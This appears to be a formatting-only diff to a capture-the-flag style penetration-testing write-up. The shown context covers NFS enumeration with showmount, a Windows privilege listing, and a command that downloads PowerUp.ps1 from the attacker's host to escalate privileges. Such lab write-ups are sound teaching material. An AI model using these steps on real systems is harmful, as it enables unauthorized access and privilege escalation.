@@ -31,7 +31,7 @@ PORT      STATE SERVICE
 
 ### NFS
 
-Network File System was publicly available on port 2049, and this is not a port I see often. This service can have very interesting files and permissions, so let's enumerate it via `showmount`.&#x20;
+Network File System was publicly available on port 2049, and this is not a port I see often. This service can have very interesting files and permissions, so let's enumerate it via `showmount`.
 
 ```
 $ showmount -e 10.129.227.150
@@ -182,7 +182,7 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disable
 ```
 
-We see that we have a ton of privileges, and most importantly SeImpersonatePrivilege is enabled. This means that we probably have some cotnrol over services and this could be used for PE. I used `PowerUp.ps1` to exploit this system.&#x20;
+We see that we have a ton of privileges, and most importantly SeImpersonatePrivilege is enabled. This means that we probably have some cotnrol over services and this could be used for PE. I used `PowerUp.ps1` to exploit this system.
 
 ```
 PS C:\windows\tasks> wget 10.10.14.13:8000/powerup.ps1 -O powerup.ps1
